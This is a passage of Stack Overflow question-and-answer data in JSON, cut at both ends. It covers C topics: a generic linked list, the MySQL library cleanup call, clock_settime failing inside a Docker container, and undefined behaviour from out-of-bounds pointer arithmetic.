"D.A", "link": "https://stackoverflow.com/users/10708317/d-a"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544640678, "post_id": 53748943, "comment_id": 94351688, "body": "@chux why? the element is a void*, so we dont know what the type it will get, so we have to allocate memory here, right?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544640904, "post_id": 53748943, "comment_id": 94351816, "body": "No.  You have a linked list of pointers - we know its type - <code>void *</code>.  Without going into things, it would be better for you to successfully make a linked list of <code>int</code> and then port that to &quot;generic&quot; types."}, {"owner": {"reputation": 13, "user_id": 10708317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69eaf60d1f4adc68a7bb69d99871e14d?s=128&d=identicon&r=PG&f=1", "display_name": "D.A", "link": "https://stackoverflow.com/users/10708317/d-a"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544641581, "post_id": 53748943, "comment_id": 94352141, "body": "@chux that is where I dont get it, If we dont know the type, then how the memory will allocate the correct one related to the type? chat is 1 byte, int is 4 byte and so on,"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544641949, "post_id": 53748943, "comment_id": 94352321, "body": "But we do know the type with <code>typedef void* Element;</code>  The element type is <code>void *</code>.  There are 2 coding goals you are attempting.  Making a linked list.  Making the LL generic.  I recommend again, code a LL for a specific type, then approach the &quot;generic&quot; attribute.  Good luck."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10708317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69eaf60d1f4adc68a7bb69d99871e14d?s=128&d=identicon&r=PG&f=1", "display_name": "D.A", "link": "https://stackoverflow.com/users/10708317/d-a"}, "edited": false, "score": 0, "creation_date": 1544698020, "post_id": 53751333, "comment_id": 94372067, "body": "But when I check this link: <a href=\"https://www.geeksforgeeks.org/generic-linked-list-in-c-2/\" rel=\"nofollow noreferrer\">geeksforgeeks.org/generic-linked-list-in-c-2</a> , I see that they allocate a memory in the heap for the &quot;element&quot; as well, (in there case it is node), and here where I get confused!!!"}, {"owner": {"reputation": 32686, "user_id": 10396, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ddbfebb47432f6599da361df6a135c7c?s=128&d=identicon&r=PG", "display_name": "AShelly", "link": "https://stackoverflow.com/users/10396/ashelly"}, "reply_to_user": {"reputation": 13, "user_id": 10708317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69eaf60d1f4adc68a7bb69d99871e14d?s=128&d=identicon&r=PG&f=1", "display_name": "D.A", "link": "https://stackoverflow.com/users/10708317/d-a"}, "edited": false, "score": 0, "creation_date": 1544718282, "post_id": 53751333, "comment_id": 94384148, "body": "Yes, you need to allocate space for both the pointers (the node: in your case <code>uniqueOrderedList</code> ) <i>and</i> the item being stored (the value :<code>*Element</code>).   The linked example is using the strategey I describe as 1b."}], "tags": [], "owner": {"reputation": 32686, "user_id": 10396, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ddbfebb47432f6599da361df6a135c7c?s=128&d=identicon&r=PG", "display_name": "AShelly", "link": "https://stackoverflow.com/users/10396/ashelly"}, "is_accepted": false, "score": 0, "last_activity_date": 1544648744, "creation_date": 1544648744, "answer_id": 53751333, "question_id": 53748943, "link": "https://stackoverflow.com/questions/53748943/how-to-implement-generic-linked-list-in-c/53751333#53751333", "title": "How to implement generic linked list in c", "body": "<p>The first step is to get all the fiddly details of connecting nodes right.  @chux has good advice in the comments - just implement it with <code>int</code> or <code>float</code> types first to make sure it is correct.</p>\n\n<p>The bigger issue is what to put in place of <code>/*some parameters*/</code>, in order to make the list generic.  Specifically, what type should you use for the \"value\" argument of the <code>add_node</code> function. </p>\n\n<p>The only type that you can freely convert back and forth from any other type is <code>void*</code>.  You could just store copies of the pointers directly in the nodes - but that means you need to ensure that the variables they point to never go out of scope.  You could never add the address of a stack local variable to the list.</p>\n\n<p>There are several ways around this.  </p>\n\n<ol>\n<li><p>You can keep track of the item size and use malloc and memcpy to create nodes big enough to hold the data.</p>\n\n<p>a. Declare the item size when the list is created.  <code>list = makelist(sizeof(myType))</code>.  This would work best with a unique head type that stores the size.</p>\n\n<p>b. Force the users to pass the size for each node:  <code>list = add_node(list, &amp;item, sizeof(item))</code> . </p>\n\n<p>c. Strategy 1b, but use a macro to pass the size:  <code>#define add_node(l,item) (add_node_impl(l, &amp;item, sizeof(item))</code></p></li>\n</ol>\n\n<p>These strategies have the disadvantage that there is no type safety.  The compiler won't detect if you pass strings to your list of floats.</p>\n\n<ol start=\"2\">\n<li><p>You can use macros to generate specific functions for your listable type</p>\n\n<p><code>#define VALUE_T MyType\n #define LISTOF(type) type ## list\n LISTOF(VALUE_T) add_node(LISTOF(VALUE_T) l, VALUE_T v) {\n   /* alloc(sizeof(VALUE_T)),copy from &amp;v, link into l */\n }</code></p></li>\n</ol>\n\n<p>This strategy is more typesafe, but is macro-heavy, which makes it hard to get right, and hard to debug. It ends up working like a more explicit version of C++ templates, where you have to ensure there is a copy of the code generated for every different type you use.</p>\n"}], "owner": {"reputation": 13, "user_id": 10708317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69eaf60d1f4adc68a7bb69d99871e14d?s=128&d=identicon&r=PG&f=1", "display_name": "D.A", "link": "https://stackoverflow.com/users/10708317/d-a"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1597, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1544648744, "creation_date": 1544638138, "question_id": 53748943, "link": "https://stackoverflow.com/questions/53748943/how-to-implement-generic-linked-list-in-c", "title": "How to implement generic linked list in c", "body": "<p>I want to create a generic linked list in c, Below is the way I created it, but I am not sure if that is the correct way to do it, I allocate a new memory in the heap for the struct uniqueOrderedList_t, and then allocate a new memory in the heap as well for the element as I want it to be generic, is that the right way to do it? and what about the \"next pointer\", do I need to allocate memory for it as well? </p>\n\n<pre><code>#the .h file contain:\ntypedef void* Element;\ntypedef struct uniqueOrderedList_t* UniqueOrderedList;\nUniqueOrderedList uniqueOrderedListCreate(/*some parameters*/);\n</code></pre>\n\n<hr>\n\n<pre><code>#the .c file:\nstruct uniqueOrderedList_t{\n  Element element;\n  struct uniqueOrderedList_t* next;  \n};\n\nuniqueOrderedList uniqueOrderedListCreate(/*some arguments*/){\n   UniqueOrderedList newList = malloc(sizeof(*newList));\n if(!newList){\n  return NULL;\n }\n newLust-&gt;element = malloc(sizeof(Element));\n   if(!element){\n     return NULL;\n   }\n newList-&gt;next = NULL;\n\n}\n</code></pre>\n"}, {"tags": ["mysql", "c"], "answers": [{"tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": false, "score": 0, "last_activity_date": 1544638109, "creation_date": 1544638109, "answer_id": 53748937, "question_id": 53748900, "link": "https://stackoverflow.com/questions/53748900/should-i-execute-mysql-library-end-after-each-connection-close/53748937#53748937", "title": "Should I execute mysql-library-end() after each connection close", "body": "<p><code>mysql_library_end</code> means that you absolutely cannot be using the library after that unless you reinitialize. I.e. if by \"each connection\" you mean that there are simultaneous connections, then you <strong>mustn't</strong> call it after each disconnect.</p>\n"}], "owner": {"reputation": 21, "user_id": 2730493, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EqRLO.jpg?s=128&g=1", "display_name": "myTechWisdom", "link": "https://stackoverflow.com/users/2730493/mytechwisdom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544638109, "creation_date": 1544637945, "question_id": 53748900, "link": "https://stackoverflow.com/questions/53748900/should-i-execute-mysql-library-end-after-each-connection-close", "title": "Should I execute mysql-library-end() after each connection close", "body": "<p>New to C and MySQL.  I have an application that makes many calls to MySQL database. \n Using ValGrind to find memory leaks in program.  Came across the following link:</p>\n\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/mysql-library-end.html\" rel=\"nofollow noreferrer\">https://dev.mysql.com/doc/refman/8.0/en/mysql-library-end.html</a></p>\n\n<p>My question is should I be running mysql_library_end() after each connection close.  </p>\n\n<p>Or </p>\n\n<p>Is it sufficient to run mysql_library_end() at end of program.  I'm currently running my C application as a linux service so if it crashes it just restarts.  </p>\n"}, {"tags": ["c", "linux", "docker", "ubuntu", "time"], "comments": [{"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1544638464, "post_id": 53748644, "comment_id": 94350566, "body": "I&#39;d certainly <i>hope</i> it would fail -- if a container could set the time for your entire host, that&#39;s not exactly effective isolation."}, {"owner": {"reputation": 106, "user_id": 3294313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c1a00d3cc754508950bdbc84f4374a4?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/3294313/paul"}, "reply_to_user": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1544639180, "post_id": 53748644, "comment_id": 94350923, "body": "Yea, in hindsight the answer should have been obvious. For whatever reason I didn&#39;t consider that the container shares the system clock with the host. Since the clock lives in the kernel and the host and container share the same kernel it stands to reason that they also share the clock."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1544639310, "post_id": 53748644, "comment_id": 94350985, "body": "It looks like there&#39;ve been <a href=\"http://lkml.iu.edu/hypermail/linux/kernel/1809.2/03853.html\" rel=\"nofollow noreferrer\">proposals</a> to implement a time namespace (just as there are existing filesystem/procfs/network/etc namespaces for kernel facilities Docker can isolate today), so containers could have their own clocks -- maybe someday in the future this Q&amp;A entry will be outdated. :)"}], "answers": [{"tags": [], "owner": {"reputation": 106, "user_id": 3294313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c1a00d3cc754508950bdbc84f4374a4?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/3294313/paul"}, "is_accepted": false, "score": 0, "last_activity_date": 1544638238, "creation_date": 1544638238, "answer_id": 53748962, "question_id": 53748644, "link": "https://stackoverflow.com/questions/53748644/linux-syscall-clock-settime-fails-with-eperm-in-docker-container/53748962#53748962", "title": "Linux syscall clock_settime(...) fails with EPERM in Docker container", "body": "<p>Aha, the short answer is that the <code>--privileged</code> flag needs to be passed when running the container.</p>\n\n<p>From the Docker documentation:</p>\n\n<blockquote>\n  <p>Full container capabilities (--privileged)</p>\n  \n  <p>$ docker run -t -i --rm ubuntu bash</p>\n  \n  <p>root@bc338942ef20:/# mount -t tmpfs none /mnt</p>\n  \n  <p>mount: permission denied</p>\n  \n  <p>This will not work, because by default, most potentially dangerous kernel capabilities are dropped; including cap_sys_admin (which is required to mount filesystems). However, the --privileged flag will allow it to run...</p>\n</blockquote>\n"}], "owner": {"reputation": 106, "user_id": 3294313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c1a00d3cc754508950bdbc84f4374a4?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/3294313/paul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 576, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544638238, "creation_date": 1544636898, "last_edit_date": 1544637890, "question_id": 53748644, "link": "https://stackoverflow.com/questions/53748644/linux-syscall-clock-settime-fails-with-eperm-in-docker-container", "title": "Linux syscall clock_settime(...) fails with EPERM in Docker container", "body": "<p>Tl;dr: When I try executing the clock_settime(...) linux syscall in an Ubuntu 18.04 container it fails with an EPERM error despite the program running as root. Running the exact same program as root outside of the container on Ubuntu 18.04 succeeds.</p>\n\n<p>The program is as follows:</p>\n\n<pre><code>/*  main.c: This program sets the clock forward 1 day. */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;time.h&gt;\n\nint main( void )\n{\n    struct timespec stime;\n\n    if( clock_gettime( CLOCK_REALTIME, &amp;stime) == -1 ) {\n        perror( \"getclock\" );\n        exit( EXIT_FAILURE );\n    }\n\n    stime.tv_sec += (60*60)*24L;  /* Add one day */\n    stime.tv_nsec = 0;\n\n    if( clock_settime( CLOCK_REALTIME, &amp;stime) == -1 ) {\n        perror( \"setclock\" );\n        exit( EXIT_FAILURE );\n    }\n\n    return( EXIT_SUCCESS );\n}\n</code></pre>\n\n<p>(Taken from <a href=\"https://users.pja.edu.pl/~jms/qnx/help/watcom/clibref/qnx/clock_settime.html\" rel=\"nofollow noreferrer\">https://users.pja.edu.pl/~jms/qnx/help/watcom/clibref/qnx/clock_settime.html</a>)</p>\n\n<p>When running outside of the container, the date is successfully updated:</p>\n\n<pre><code># gcc main.c -o pushtime\n# date &amp;&amp; ./pushtime &amp;&amp; date\nWed Dec 12 09:38:36 PST 2018\nTue Dec 11 09:38:38 PST 2018\n</code></pre>\n\n<p>When running inside of the container, an EPERM error is raised:</p>\n\n<pre><code># gcc main.c -o pushtime\n# docker run -it -v `pwd`:/workspace ubuntu:bionic /workspace/pushtime\nsetclock: Operation not permitted\n</code></pre>\n\n<p>Given that the commands are running as root, I'm confused why there would be an error with permissions and I haven't found anything yet in Docker's documentation that explains why.</p>\n\n<p><strong>Edit:</strong> I just realized that an easier demonstration of the error is as follows:</p>\n\n<pre><code>root@host:~# sudo docker run -it ubuntu:bionic /bin/bash\nroot@container:/# date -s '2018-02-01 21:39'\ndate: cannot set date: Operation not permitted\nThu Feb  1 21:39:00 UTC 2018\n</code></pre>\n"}, {"tags": ["c", "undefined-behavior"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544635917, "post_id": 53748369, "comment_id": 94349260, "body": "the first one doesn&#39;t..."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544635964, "post_id": 53748369, "comment_id": 94349293, "body": "@Jean-Fran&#231;oisFabre - Yes, got that.  Interested in your thoughts about 2nd and 3rd statements."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544636237, "post_id": 53748369, "comment_id": 94349417, "body": "your answer in the link indicate that you already knew about that :)"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544636372, "post_id": 53748369, "comment_id": 94349514, "body": "@Jean-Fran&#231;oisFabre - Your comment (and now your answer) parallel my thoughts, but in the chat, at the bottom of the comments in that linked question, there is an alternative viewpoint.  We agreed it would be good to post as a stand alone question."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1544636484, "post_id": 53748369, "comment_id": 94349573, "body": "oh I see, and I edited in the meanwhile, telepathy I guess."}, {"owner": {"reputation": 9367, "user_id": 4454124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c094d8979fb41b789a7c7f21d9329359?s=128&d=identicon&r=PG&f=1", "display_name": "mnistic", "link": "https://stackoverflow.com/users/4454124/mnistic"}, "edited": false, "score": 1, "creation_date": 1544637138, "post_id": 53748369, "comment_id": 94349906, "body": "Arithmetic on out-of-bounds pointers is UB: <a href=\"https://stackoverflow.com/questions/10473573/why-is-out-of-bounds-pointer-arithmetic-undefined-behaviour\" title=\"why is out of bounds pointer arithmetic undefined behaviour\">stackoverflow.com/questions/10473573/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1544636256, "post_id": 53748425, "comment_id": 94349425, "body": "Thanks.  This looks pretty clear, and parallels what I thought, and expressed in the question this one is derived from. (linked at top)  However, there are other viewpoints that have been expressed as well.  I hope to get some additional discussion."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 2, "creation_date": 1544636291, "post_id": 53748425, "comment_id": 94349449, "body": "discussing undefined behaviour is an all-time classic in the C tag :)"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 5, "creation_date": 1544636580, "post_id": 53748425, "comment_id": 94349638, "body": "Actually pointer arithmetic is only allowed to go up to one over the end of an array, otherwise the arithmetic itself is undefined behavior."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544636758, "post_id": 53748425, "comment_id": 94349741, "body": "@Osiris yes, but since you do nothing with the pointer it should not crash or something. Invalid it is But you&#39;re right. I don&#39;t know how to/if I should change my answer to add this."}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 1, "creation_date": 1544637010, "post_id": 53748425, "comment_id": 94349850, "body": "@Jean-Fran&#231;oisFabre I agree that it would be unusual to crash, but it is undefined behavior according to the standard, and since the question is asking about it ..."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1544637083, "post_id": 53748425, "comment_id": 94349886, "body": "I&#39;ll leave it as is. Chux answer explains that exactly."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1544639350, "post_id": 53748425, "comment_id": 94351014, "body": "Re: \u201c<code>p</code> is made so it points to an element\u201d: \u201cElement\u201d is not the correct term here. An element is a member of some collection. <code>p</code> is set to point to the single object <code>variable</code>, not to an element. <code>p</code> does behave, for pointer arithmetic, as a pointer to the first element of an array of length one."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1544639531, "post_id": 53748425, "comment_id": 94351103, "body": "It is not okay for this answer to assert that pointer arithmetic itself is not the issue. C permits implementations to have complicated pointer implementations, in which merely doing arithmetic on pointers may require accessing behind-the-scenes data, so doing invalid pointer arithmetic can crash."}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 1, "last_activity_date": 1544636419, "last_edit_date": 1544636419, "creation_date": 1544636009, "answer_id": 53748425, "question_id": 53748369, "link": "https://stackoverflow.com/questions/53748369/do-the-printf-statements-in-this-example-invoke-undefined-behavior/53748425#53748425", "title": "Do the printf statements in this example invoke Undefined Behavior?", "body": "<p><code>p</code> is made so it points to an element, which isn't different from an array of 1 element.</p>\n\n<p>So accessing more than one consecutive element by incrementing <code>p</code> is <em>undefined behaviour</em>.</p>\n\n<p>To be valid you'd need to point to 3 consecutive elements like:</p>\n\n<pre><code>struct my_structure variable[3];  // should be initialized too\n</code></pre>\n\n<p>To be complete, <code>p++</code> in itself isn't the issue (the pointer points to an invalid location, so what? it's like this after most pointer loops), it's the fact that we try to <em>read</em> from the memory when doing <code>p-&gt;i</code> on an invalid location which is the problem.</p>\n"}, {"comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1544637333, "post_id": 53748667, "comment_id": 94350004, "body": "by your phrase <i>attempts to</i> <b><i>form</i></b> <i>a pointer</i>, do you mean <i>attempts to</i> <b><i>move</i></b> <i>a pointer</i>?  And if so, is it illegal to change the location of where a pointer is pointing even if it does not access that location?"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 2, "creation_date": 1544637444, "post_id": 53748667, "comment_id": 94350061, "body": "@ryyker It is the pointer arithmetic (<code>p++</code>) which invokes undefined behavior."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544637492, "post_id": 53748667, "comment_id": 94350082, "body": "@Osiris - Yes, I have seen this comment by you in other locations.  Will you please explain it further?.  Thanks."}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 2, "creation_date": 1544637713, "post_id": 53748667, "comment_id": 94350198, "body": "@ryyker Adding an integer to a pointer leads to undefined behavior if the result is further than one past of the end of the array object. So the first <code>p++</code> is fine since the result is only one past of the end, while the second is illegal. It is stated in ISO/IEC 9899:2011 6.5.6.8, see <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf#%5B%7B%22num%22%3A227%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C-27%2C816%2Cnull%5D\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1544638183, "post_id": 53748667, "comment_id": 94350426, "body": "@Osiris - Thank you for that detail.  I did not know that.  It seems worth posting an answer.  Although alluded to in other answers, the clarity of reason makes it relevant."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 4, "last_activity_date": 1544638201, "last_edit_date": 1544638201, "creation_date": 1544636981, "answer_id": 53748667, "question_id": 53748369, "link": "https://stackoverflow.com/questions/53748369/do-the-printf-statements-in-this-example-invoke-undefined-behavior/53748667#53748667", "title": "Do the printf statements in this example invoke Undefined Behavior?", "body": "<p>In this case, first <code>printf()</code> is OK per C11 6.5.6.8 </p>\n\n<pre><code>printf(\"NUMBER: %d\\n\", p++-&gt;i);  \n</code></pre>\n\n<hr>\n\n<p>2nd <code>p++</code> is <em>undefined behavior</em> (UB), <a href=\"https://stackoverflow.com/questions/53748369/do-the-printf-statements-in-this-example-invoke-undefined-behavior/53748667?noredirect=1#comment94350198_53748667\">@Osiris</a>, as it attempts to form a pointer more than 1 past <code>struct my_structure variable</code>.  </p>\n\n<p>The rest of code is irrelevant.</p>\n\n<pre><code>//                     vvv\nprintf(\"NUMBER: %d\\n\", 